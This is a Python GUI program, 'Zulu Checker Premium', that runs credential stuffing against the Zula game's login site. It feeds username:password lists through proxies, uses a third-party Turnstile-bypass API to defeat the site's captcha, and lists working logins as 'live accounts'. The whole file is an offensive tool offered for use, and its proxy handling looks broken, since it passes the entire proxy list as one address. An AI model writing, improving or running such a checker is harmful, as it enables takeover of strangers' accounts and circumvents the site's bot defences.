import sys
import os
import asyncio
import aiohttp
import json
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QPushButton, QTextEdit, QVBoxLayout, QHBoxLayout,
    QWidget, QFileDialog, QLabel, QProgressBar, QFrame, QScrollArea
)
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from PyQt5.QtGui import QFont, QPalette, QColor
from colorama import Fore, init

init(autoreset=True)

CONFIG_FILE = "config.json"

def load_config():
    if not os.path.exists(CONFIG_FILE):
        default_config = {
            "rapidapi_key": "your-rapidapi-key-here"
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(default_config, f, indent=4)
        print(f"Default config created. Please update {CONFIG_FILE} with your RapidAPI key.")
        sys.exit(1)
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

config = load_config()

class WorkerThread(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, combo_file, proxy_file):
        super().__init__()
        self.combo_file = combo_file
        self.proxy_file = proxy_file

    async def zulu(self, combo, session, proxies):
        try:
            user, pas = combo.strip().split(":")
            if not user or not pas:
                return
        except:
            return

        headers = {
            "Origin": "https://hesap.zulaoyun.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0"
        }

        async with session.get("https://hesap.zulaoyun.com/zula-giris-yap", headers=headers,proxy=f"http://{proxies}") as response:
            login_data = await response.text()

        try:
            token = login_data.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
        except IndexError:
            self.log_signal.emit(f"{combo} - Token not found response status code: {response.status}")
            self.log_signal.emit(f"{combo} - Retrying after 10 seconds")
            await asyncio.sleep(10)
            return await self.zulu(combo, session, proxies)

        rapidheaders = {
            "x-rapidapi-key": config["rapidapi_key"],
            "x-rapidapi-host": "turnstile-bypass-api1.p.rapidapi.com",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        }

        async with session.post('https://turnstile-bypass-api1.p.rapidapi.com/check',headers=rapidheaders,json={"url": "https://hesap.zulaoyun.com/zula-giris-yap", "sitekey": "0x4AAAAAAAyOAhZopAtgo73i", "type": "cf"}) as captcha_response:
            cf = await captcha_response.json()
            captcha_token = cf.get('captcha_token')
            if captcha_token is None:
                self.log_signal.emit(f"{combo} - Captcha token not found")
                return await self.zulu(combo, session, proxies)
            self.log_signal.emit(f"{combo} - Captcha token received")

        datas = {
            "__RequestVerificationToken": token,
            "UserName": user,
            "Password": pas,
            "RememberMe": False,
            "cf_turnstile_response": captcha_token
        }

        async with session.post("https://hesap.zulaoyun.com/zula-giris-yap", headers=headers, data=datas,proxy=f"http://{proxies}") as final_response:
            response_text = await final_response.text()

        if "Kullanıcı adı ya da şifre yanlış." in response_text:
            self.log_signal.emit( f"{combo} - Invalid username or password.")
        else:
            self.log_signal.emit(f"{combo} - Login successful!")

    async def run_tasks(self):
        with open(self.combo_file, 'r', encoding="latin") as f:
            combos = f.read().splitlines()

        with open(self.proxy_file, 'r', encoding="utf-8") as f:
            proxies = f.read().splitlines()

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            chunk_size = 7
            for i in range(0, len(combos), chunk_size):
                tasks = [self.zulu(combo, session, proxies) for combo in combos[i:i + chunk_size]]
                await asyncio.gather(*tasks)

    def run(self):
        asyncio.run(self.run_tasks())

class CustomButton(QPushButton):
    def __init__(self, text):
        super().__init__(text)
        self.setMinimumHeight(45)
        self.setStyleSheet("""
            QPushButton {
                background-color: #2980b9;
                border: 2px solid #2980b9;
                color: white;
                border-radius: 8px;
                font-size: 15px;
                font-weight: bold;
                font-family: 'Segoe UI';
                padding: 5px 15px;
            }
            QPushButton:hover {
                background-color: #3498db;
                border: 2px solid #3498db;
            }
            QPushButton:pressed {
                background-color: #2475a8;
            }
        """)

class StatsWidget(QFrame):
    def __init__(self):
        super().__init__()
        self.setStyleSheet("""
            QFrame {
                background-color: #2c3e50;
                border: 2px solid #34495e;
                border-radius: 15px;
                padding: 15px;
            }
            QLabel {
                color: #ecf0f1;
                font-size: 16px;
                font-weight: bold;
                font-family: 'Segoe UI';
                padding: 5px;
            }
        """)
        
        self.layout = QVBoxLayout()
        self.layout.setSpacing(10)
        
        title = QLabel("⚡ CHECKER STATS ⚡")
        title.setStyleSheet("font-size: 20px; color: #3498db; text-align: center;")
        title.setAlignment(Qt.AlignCenter)
        
        self.total_label = QLabel("📊 Total: 0")
        self.success_label = QLabel("✅ Success: 0")
        self.fail_label = QLabel("❌ Failed: 0")
        
        self.layout.addWidget(title)
        for label in [self.total_label, self.success_label, self.fail_label]:
            self.layout.addWidget(label)
        
        self.setLayout(self.layout)


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("⚡ Zulu Checker Premium author wezaxyy ⚡")
        self.setGeometry(100, 100, 1200, 800)
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1a1a2e;
            }
            QLabel {
                color: #ecf0f1;
                font-size: 16px;
                font-family: 'Segoe UI';
            }
        """)
        
        
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        main_layout = QHBoxLayout()
        main_widget.setLayout(main_layout)

        
        left_panel = QWidget()
        left_layout = QVBoxLayout()
        left_panel.setMaximumWidth(400)
        left_panel.setLayout(left_layout)

        
        self.stats = StatsWidget()
        left_layout.addWidget(self.stats)

        
        self.combo_label = QLabel("Combo File: Not selected")
        self.combo_label.setStyleSheet("color: white;")
        self.combo_button = CustomButton("Choose Combo File")
        self.combo_button.clicked.connect(self.choose_combo_file)

        self.proxy_label = QLabel("Proxy File: Not selected")
        self.proxy_label.setStyleSheet("color: white;")
        self.proxy_button = CustomButton("Choose Proxy File")
        self.proxy_button.clicked.connect(self.choose_proxy_file)

        self.start_button = CustomButton("Start Checker")
        self.start_button.clicked.connect(self.start_process)

        for widget in [self.combo_label, self.combo_button, 
                      self.proxy_label, self.proxy_button,
                      self.start_button]:
            left_layout.addWidget(widget)

        left_layout.addStretch()
        main_layout.addWidget(left_panel)

        
        right_panel = QWidget()
        right_layout = QVBoxLayout()
        right_panel.setLayout(right_layout)

        
        self.results_label = QLabel("🔍 CHECKER RESULTS")
        self.results_label.setStyleSheet("""
            color: #3498db;
            font-size: 22px;
            font-weight: bold;
            font-family: 'Segoe UI';
            padding: 10px;
        """)
        right_layout.addWidget(self.results_label)

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setStyleSheet("""
            QTextEdit {
                background-color: #2c3e50;
                color: #ecf0f1;
                border: 2px solid #34495e;
                border-radius: 15px;
                padding: 15px;
                font-family: 'Consolas';
                font-size: 14px;
            }
        """)
        right_layout.addWidget(self.log_area)

        
        self.live_label = QLabel("💎 LIVE ACCOUNTS")
        self.live_label.setStyleSheet("""
            color: #2ecc71;
            font-size: 22px;
            font-weight: bold;
            font-family: 'Segoe UI';
            padding: 10px;
        """)
        right_layout.addWidget(self.live_label)

        self.live_area = QTextEdit()
        self.live_area.setReadOnly(True)
        self.live_area.setStyleSheet("""
            QTextEdit {
                background-color: #27ae60;
                color: white;
                border: 2px solid #2ecc71;
                border-radius: 15px;
                padding: 15px;
                font-family: 'Consolas';
                font-size: 14px;
            }
        """)
        right_layout.addWidget(self.live_area)

        main_layout.addWidget(right_panel)

        
        self.combo_file = None
        self.proxy_file = None
        self.worker_thread = None
        self.success_count = 0
        self.fail_count = 0

    def choose_combo_file(self):
        options = QFileDialog.Options()
        file, _ = QFileDialog.getOpenFileName(self, "Select Combo File", "", 
                                            "Text Files (*.txt);;All Files (*)", options=options)
        if file:
            self.combo_file = file
            self.combo_label.setText(f"Combo File: {os.path.basename(file)}")

    def choose_proxy_file(self):
        options = QFileDialog.Options()
        file, _ = QFileDialog.getOpenFileName(self, "Select Proxy File", "", 
                                            "Text Files (*.txt);;All Files (*)", options=options)
        if file:
            self.proxy_file = file
            self.proxy_label.setText(f"Proxy File: {os.path.basename(file)}")

    def update_log(self, message):
        if "Login successful" in message:
            self.success_count += 1
            formatted_msg = f"✅ {message}"
            self.live_area.append(formatted_msg)
        elif "Invalid username or password" in message:
            self.fail_count += 1
            formatted_msg = f"❌ {message}"
        else:
            formatted_msg = f"ℹ️ {message}"
        
        self.log_area.append(formatted_msg)
        self.stats.success_label.setText(f"✅ Success: {self.success_count}")
        self.stats.fail_label.setText(f"❌ Failed: {self.fail_count}")
        
    def start_process(self):
        if not self.combo_file or not self.proxy_file:
            self.log_area.append("Please select both combo and proxy files first.")
            return

        self.success_count = 0
        self.fail_count = 0
        self.log_area.clear()
        self.live_area.clear()
        
        with open(self.combo_file, 'r') as f:
            total_lines = sum(1 for line in f)
        self.stats.total_label.setText(f"Total: {total_lines}")
        
        self.worker_thread = WorkerThread(self.combo_file, self.proxy_file)
        self.worker_thread.log_signal.connect(self.update_log)
        self.worker_thread.start()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())